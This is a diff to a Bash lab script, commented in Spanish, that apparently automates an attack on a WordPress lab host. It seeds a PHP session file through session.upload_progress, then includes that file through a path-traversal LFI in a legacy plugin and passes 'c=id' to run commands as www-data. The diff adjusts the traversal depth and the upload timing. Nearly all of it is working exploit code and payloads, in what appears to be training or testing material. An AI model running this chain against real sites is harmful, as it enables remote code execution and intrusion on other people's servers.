@@ -118,7 +118,7 @@ entry_a_run() {
     warn "el PoC terminó con código $rc (documentar la etapa donde falló)"
   else
     ok "el PoC terminó sin error; comprobar el archivo de prueba"
-    printf '  curl -sk "%s?file=../../../../../../tmp/p1"\n' "https://wp.uni.lab${LFI_PATH}" >&2
+    printf '  curl -sk "%s?file=../../../../../../../tmp/p1"\n' "https://wp.uni.lab${LFI_PATH}" >&2
   fi
 }
 
@@ -131,22 +131,23 @@ entry_b_run() {
 
   step "entry-b · sembrando sesión $sid (session.upload_progress)"
   # El valor de PHP_SESSION_UPLOAD_PROGRESS se escribe en el archivo de sesión.
-  # Se sube despacio para que el archivo exista mientras se pide el LFI.
+  # Se sube despacio, se corta a los 4 s (cleanup=Off conserva el archivo) y
+  # recién entonces se pide el LFI: no se compite por el worker de Apache.
   curl -sk --max-time 180 --limit-rate 128k \
     -b "PHPSESSID=${sid}" \
     -F "PHP_SESSION_UPLOAD_PROGRESS=${payload}" \
     -F "payload=@${bigfile};filename=payload.bin" \
     "${M1_URL%/}/lab/session.php" -o /dev/null &
   bigpid=$!
-  sleep 2
+  sleep 4
+  kill "$bigpid" 2>/dev/null || true
+  wait "$bigpid" 2>/dev/null || true
 
   step "entry-b · LFI contra el plugin legacy-download"
   resp=$(curl -sk --max-time 30 -G "https://wp.uni.lab${LFI_PATH}" \
-           --data-urlencode "file=../../../../../../tmp/sess_${sid}" \
+           --data-urlencode "file=../../../../../../../tmp/sess_${sid}" \
            --data-urlencode "c=id" || true)
 
-  kill "$bigpid" 2>/dev/null || true
-  wait "$bigpid" 2>/dev/null || true
   rm -f "$bigfile"
 
   printf '%s\n' "$resp" | tail -n 5
@@ -200,7 +201,7 @@ cat <<EOF
     --profile lab --no-auto-offsets --proof-file ''
 
   # lectura del marcador por el mismo sink LFI (canal independiente)
-  curl -sk "https://wp.uni.lab${LFI_PATH}?file=../../../../../../tmp/p1"
+  curl -sk "https://wp.uni.lab${LFI_PATH}?file=../../../../../../../tmp/p1"
 
   # si falla en stage 1 (lo esperado), anotar:
   #   HEAP_LEAK_FAILED / stage 1 → limitación de entry-a, NO se declara resuelto
@@ -222,7 +223,7 @@ cat <<EOF
 
   # 2) incluir el archivo de sesión por el LFI del plugin heredado
   curl -sk -G "https://wp.uni.lab${LFI_PATH}" \\
-    --data-urlencode "file=../../../../../../tmp/sess_\$SID" \\
+    --data-urlencode "file=../../../../../../../tmp/sess_\$SID" \\
     --data-urlencode "c=id"
 
   # 3) esperado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
